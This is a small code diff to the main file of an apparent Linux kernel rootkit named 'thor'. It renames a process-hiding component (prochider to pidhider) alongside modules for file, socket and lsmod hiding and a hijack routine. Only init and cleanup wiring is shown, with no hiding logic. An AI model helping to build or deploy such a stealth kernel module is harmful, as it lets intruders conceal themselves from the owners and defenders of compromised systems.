@@ -7,13 +7,13 @@
 #include "logging.h"
 #include "lsmodhider.h"
 #include "procfile.h"
-#include "prochider.h"
+#include "pidhider.h"
 #include "sockethider.h"
 
 static void thor_cleanup(void)
 {
     procfile_cleanup();
-    prochider_cleanup();
+    pidhider_cleanup();
     filehider_cleanup();
     sockethider_cleanup();
     lsmodhider_cleanup();
@@ -25,7 +25,7 @@ static int __init thor_init(void)
 {
     if (hijack_init() < 0 ||
         procfile_init() < 0 ||
-        prochider_init() < 0 ||
+        pidhider_init() < 0 ||
         filehider_init() < 0 ||
         lsmodhider_init() < 0 ||
         sockethider_init() < 0) {
